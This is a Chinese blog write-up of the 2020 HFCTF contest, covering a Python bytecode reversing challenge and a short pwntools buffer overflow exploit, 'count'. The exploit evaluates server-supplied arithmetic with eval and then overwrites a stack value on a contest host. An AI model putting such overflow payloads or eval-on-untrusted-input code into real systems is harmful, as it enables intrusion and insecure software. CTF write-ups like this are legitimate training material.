@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>0x01 - 2020虎符CTF记录 | Bi0x</title><meta name="description" content="0x01 - 2020虎符CTF记录"><meta name="keywords" content="WP"><meta name="author" content="Bi0x,bi0x@foxmail.com"><meta name="copyright" content="Bi0x"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon1.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="0x01 - 2020虎符CTF记录"><meta name="twitter:description" content="0x01 - 2020虎符CTF记录"><meta name="twitter:image" content="http://www.bi0x.cn/images/pasted-39.png"><meta property="og:type" content="article"><meta property="og:title" content="0x01 - 2020虎符CTF记录"><meta property="og:url" content="http://www.bi0x.cn/2020/04/19/wp-hfctf2020/"><meta property="og:site_name" content="Bi0x"><meta property="og:description" content="0x01 - 2020虎符CTF记录"><meta property="og:image" content="http://www.bi0x.cn/images/pasted-39.png"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = '1'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      now = new Date();
+      hour = now.getHours();
+      isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="http://www.bi0x.cn/2020/04/19/wp-hfctf2020/"><link rel="next" title="0x01 - 做题记录 (1)" href="http://www.bi0x.cn/2020/04/14/wp1/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.bi0x.cn/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: 'Snackbar.bookmark.title',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: false,
+  isFontAwesomeV5: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false
+}</script><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">7</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">5</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 小伙伴</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-game"><span class="toc-number">1.</span> <span class="toc-text">Re - game</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-count"><span class="toc-number">2.</span> <span class="toc-text">Pwn - count</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/images/pasted-39.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Bi0x</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 小伙伴</span></a></div></div></span></div><div id="post-info"><div id="post-title"><div class="posttitle">0x01 - 2020虎符CTF记录</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-04-19<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-04-19</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">1.4k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 6 分钟</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>评论数:</span><a href="/2020/04/19/wp-hfctf2020/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2020/04/19/wp-hfctf2020/" itemprop="commentCount"></span></a></div></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><ul>
+<li>太顶了，实力还是 8 行</li>
+<li>有机会还是想补补题</li>
+</ul>
+<h1 id="Re-game"><a href="#Re-game" class="headerlink" title="Re - game"></a>Re - game</h1><ul>
+<li>给了个 Python 反汇编出来的字节码文件，要基于其获取 Python 源码<ul>
+<li><a href="https://github.com/Bi0x/Downloads/raw/master/disasm.txt" target="_blank" rel="noopener">这里是文件</a></li>
+</ul>
+</li>
+<li>快 400 行，还行，可读性比汇编好多了…</li>
+<li>刚开始以为有轮子，找了半天没轮子，直接硬逆了</li>
+<li>比较需要注意的地方有挺多的，首先开始的三个 arr 列表不能抄错了<ul>
+<li>是的我抄错了，后面 debug 了好久</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># &lt;genexpr&gt; line 6 of game.py</span><br><span class="line"></span><br><span class="line">   6       0  LOAD_FAST             0  &#39;.0&#39;</span><br><span class="line">           3  FOR_ITER             32  &#39;to 38&#39;</span><br><span class="line">           6  STORE_FAST            1  &#39;x&#39;</span><br><span class="line">           9  LOAD_GLOBAL           0  &#39;ord&#39;</span><br><span class="line">          12  LOAD_FAST             1  &#39;x&#39;</span><br><span class="line">          15  CALL_FUNCTION_1       1  None</span><br><span class="line">          18  LOAD_GLOBAL           1  &#39;range&#39;</span><br><span class="line">          21  LOAD_CONST               32</span><br><span class="line">          24  LOAD_CONST               128</span><br><span class="line">          27  CALL_FUNCTION_2       2  None</span><br><span class="line">          30  COMPARE_OP            6  in</span><br><span class="line">          33  YIELD_VALUE</span><br><span class="line">          34  POP_TOP</span><br><span class="line">          35  JUMP_BACK             3  &#39;to 3&#39;</span><br><span class="line">          38  LOAD_CONST               None</span><br><span class="line">          41  RETURN_VALUE</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第一个需要注意的地方是 check0，那个 genexpr 是怎么写的不太懂</p>
+<ul>
+<li>猜测是检查字符串中的每个字符的 ascii 是否都在 range(32, 128) 里</li>
+<li>因为其中也没有涉及到运算符，故没有深究</li>
+</ul>
+</li>
+<li><p>至于 check2 函数是怎么计算出这六位的，猜测其以 <code>flag{</code> 开头，能直接计算出第六位是 <code>5</code></p>
+</li>
+<li><p>check3 是比较麻烦的了，上来一个 map 函数没反应过来，以为是 <code>map(ord(s))</code></p>
+<ul>
+<li>其实注意看的话会发现，此处值 CALL_FUNCTION_2 了一次</li>
+<li>故明白其实是调用了有两个参数的函数，那应该是 <code>map(ord,s)</code> 了</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">21       0  LOAD_GLOBAL           0  &#39;map&#39;</span><br><span class="line">         3  LOAD_GLOBAL           1  &#39;ord&#39;</span><br><span class="line">         6  LOAD_FAST             0  &#39;s&#39;</span><br><span class="line">         9  CALL_FUNCTION_2       2  None</span><br><span class="line">        12  STORE_FAST            1  &#39;arr&#39;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>还有个需要注意的是第 26 行的切片<ul>
+<li>它是获取 flag 倒数第五位到倒数第二位的字符串<strong>反向</strong>的形式，这个问题也卡了我好久</li>
+<li>实际代码应该为 <code>b = arr[-2:33:-1] * 5</code>，相同的字符串拼接五次</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">26      99  LOAD_FAST             1  &#39;arr&#39;</span><br><span class="line">       102  LOAD_CONST               -2</span><br><span class="line">       105  LOAD_CONST               33</span><br><span class="line">       108  LOAD_CONST               -1</span><br><span class="line">       111  BUILD_SLICE_3         3</span><br><span class="line">       114  BINARY_SUBSCR</span><br><span class="line">       115  LOAD_CONST               5</span><br><span class="line">       118  BINARY_MULTIPLY</span><br><span class="line">       119  STORE_FAST            4  &#39;b&#39;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>check3 里的 c 就是把 b 与 arr[7:27] 下标对应位异或，没什么难点<ul>
+<li>里面有个 lambda 函数 <code>lambda x: x[0]^x[1]</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  27     122  LOAD_GLOBAL           0  &#39;map&#39;</span><br><span class="line">         125  LOAD_LAMBDA              &#39;&lt;code_object &lt;lambda&gt;&gt;&#39;</span><br><span class="line">         128  MAKE_FUNCTION_0       0  None</span><br><span class="line">         131  LOAD_GLOBAL           6  &#39;zip&#39;</span><br><span class="line">         134  LOAD_FAST             4  &#39;b&#39;</span><br><span class="line">         137  LOAD_FAST             1  &#39;arr&#39;</span><br><span class="line">         140  LOAD_CONST               7</span><br><span class="line">         143  LOAD_CONST               27</span><br><span class="line">         146  SLICE+3</span><br><span class="line">         147  CALL_FUNCTION_2       2  None</span><br><span class="line">         150  CALL_FUNCTION_2       2  None</span><br><span class="line">         153  STORE_FAST            5  &#39;c&#39;</span><br><span class="line">         </span><br><span class="line">		 ......</span><br><span class="line"></span><br><span class="line"># &lt;lambda&gt; line 27 of game.py</span><br><span class="line"></span><br><span class="line">  27       0  LOAD_FAST             0  &#39;x&#39;</span><br><span class="line">           3  LOAD_CONST               0</span><br><span class="line">           6  BINARY_SUBSCR</span><br><span class="line">           7  LOAD_FAST             0  &#39;x&#39;</span><br><span class="line">          10  LOAD_CONST               1</span><br><span class="line">          13  BINARY_SUBSCR</span><br><span class="line">          14  BINARY_XOR</span><br><span class="line">          15  RETURN_VALUE</span><br></pre></td></tr></table></figure>
+<ul>
+<li>故完整代码如下</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">arr0 = [<span class="number">249</span>, <span class="number">91</span>, <span class="number">149</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">41</span>]</span><br><span class="line">arr1 = [<span class="number">43</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">113</span>, <span class="number">6</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">127</span>, <span class="number">60</span>]</span><br><span class="line">arr2 = [<span class="number">90</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">109</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">90</span>, <span class="number">104</span>, <span class="number">88</span>, <span class="number">102</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check0</span><span class="params">(s)</span>:</span> <span class="comment"># 检测所有字符的 ascii 码在不在 range(32, 128) 里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="comment"># 生成器逆不出来了</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(s) &lt; <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">if</span> (len(s) * len(s) % <span class="number">777</span>) ^ <span class="number">233</span> == <span class="number">513</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (((((ord(s[<span class="number">0</span>]) * <span class="number">128</span> + ord(s[<span class="number">1</span>])) * <span class="number">128</span> + ord(s[<span class="number">2</span>])) * <span class="number">128</span> + ord(s[<span class="number">3</span>])) * <span class="number">128</span> + ord(s[<span class="number">4</span>])) * <span class="number">128</span> + ord(s[<span class="number">5</span>])) == <span class="number">3533889469877L</span>:</span><br><span class="line">        <span class="keyword">if</span> ord(s[<span class="number">-1</span>]) == <span class="number">125</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check3</span><span class="params">(s)</span>:</span></span><br><span class="line">    arr = map(ord, s)</span><br><span class="line">    a = arr[<span class="number">6</span>:<span class="number">30</span>:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        <span class="keyword">if</span> (a[i] * <span class="number">17684</span> + <span class="number">372511</span>) % <span class="number">257</span> != arr0[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    b = arr[<span class="number">-2</span>:<span class="number">33</span>:<span class="number">-1</span>] * <span class="number">5</span> <span class="comment"># 倒数第五位到倒数第二位，注意是反过来的</span></span><br><span class="line">    c = map(<span class="keyword">lambda</span> x:x[<span class="number">0</span>]^x[<span class="number">1</span>], zip(b, arr[<span class="number">7</span>:<span class="number">27</span>])) <span class="comment"># b 与 arr 每对应位异或</span></span><br><span class="line">    <span class="keyword">print</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> c != arr1:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">print</span> <span class="number">3</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>, <span class="number">34</span>):</span><br><span class="line">        <span class="keyword">if</span> (arr[i] + <span class="number">107</span>) / <span class="number">16</span> + <span class="number">77</span> != arr2[p] <span class="keyword">and</span> ((arr[i] + <span class="number">117</span>) % <span class="number">16</span>) + <span class="number">99</span> != arr2[p + <span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        p = p + <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> check0(flag) <span class="keyword">and</span> check1(flag) <span class="keyword">and</span> check2(flag) <span class="keyword">and</span> check3(flag):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'no'</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>然后就是计算 flag 了，刚开始没认真看以为是密码题，其实就是简单逆向</p>
+</li>
+<li><p>长度很好处理，计算完得到 39</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> (i * i % <span class="number">777</span>) ^ <span class="number">233</span> == <span class="number">513</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后是第六位字符，也很好处理，是 <code>5</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'flag&#123;'</span></span><br><span class="line">res = <span class="number">3533889469877L</span></span><br><span class="line"><span class="keyword">print</span> res - ((((ord(s[<span class="number">0</span>]) * <span class="number">128</span> + ord(s[<span class="number">1</span>])) * <span class="number">128</span> + ord(s[<span class="number">2</span>])) * <span class="number">128</span> + ord(s[<span class="number">3</span>])) * <span class="number">128</span> + ord(s[<span class="number">4</span>])) * <span class="number">128</span></span><br><span class="line"><span class="keyword">print</span> chr(<span class="number">53</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>之后要计算八位的特定位字符，这个挺关键的，用于计算后面那个加密的 key</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">arr0 = [<span class="number">249</span>, <span class="number">91</span>, <span class="number">149</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">41</span>]</span><br><span class="line">flag = <span class="string">'flag&#123;5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(arr0)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> (i * <span class="number">17684</span> + <span class="number">372511</span>) % <span class="number">257</span> == arr0[j]:</span><br><span class="line">            flag = flag[<span class="number">0</span>:<span class="number">6</span> + j * <span class="number">3</span>] + chr(i) + flag[<span class="number">6</span> + j * <span class="number">3</span> + <span class="number">1</span>:]</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#flag&#123;5Laa5aaxaaiaaVaa5aaPaaKaaaaaaaaaa&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>根据上面得到的几位特殊位置的字符，可以计算出下标7到26的字符<ul>
+<li>注意 b 是根据上面的字符推算的，而且是反过来的</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">arr1 = [<span class="number">43</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">113</span>, <span class="number">6</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">127</span>, <span class="number">60</span>]</span><br><span class="line">b = [<span class="number">113</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">117</span>] * <span class="number">5</span></span><br><span class="line">flag2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr1)):</span><br><span class="line">    flag2 += chr(arr1[i] ^ b[i])</span><br><span class="line"><span class="keyword">print</span> flag2 <span class="comment">#ZG50ex5Yi75VqE5YePLI</span></span><br><span class="line"><span class="keyword">print</span> map(chr, b) <span class="comment">#qF3u 实际上是 u3Fq</span></span><br><span class="line"><span class="comment"># flag&#123;5LZG50ex5Yi75VqE5YePLIKaaaaaaqF3u&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后差六位的 flag，直接根据 arr3 爆破就好了</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arr2 = [<span class="number">90</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">109</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">90</span>, <span class="number">104</span>, <span class="number">88</span>, <span class="number">102</span>]</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">flag3 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">107</span>) / <span class="number">16</span> + <span class="number">77</span> == arr2[p] <span class="keyword">and</span> ((i + <span class="number">117</span>) % <span class="number">16</span>) + <span class="number">99</span> == arr2[p + <span class="number">1</span>]:</span><br><span class="line">            flag3 += chr(i)</span><br><span class="line">    p = p + <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> flag3 <span class="comment"># 'l541pN'</span></span><br><span class="line">flag = <span class="string">'flag&#123;5LZG50ex5Yi75VqE5YePLIKl541pNu3Fq&#125;'</span></span><br></pre></td></tr></table></figure>
+<h1 id="Pwn-count"><a href="#Pwn-count" class="headerlink" title="Pwn - count"></a>Pwn - count</h1><ul>
+<li>这题相对简单了，溢出点就在计算了 200 次的结果处</li>
+<li>直接借用 python 的 eval 函数，用 pwntools 获取需要计算的计算式</li>
+<li>半分钟就做完了，然后计算下偏移量 100，溢出覆盖就好了</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'39.97.210.182'</span>, <span class="number">40285</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Math: '</span>)</span><br><span class="line">    str1 = io.recvuntil(<span class="string">' = ???'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    c =  eval(str1)</span><br><span class="line">    io.sendline(str(c))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0xDC</span> - <span class="number">0x78</span>) + p64(<span class="number">304305682</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
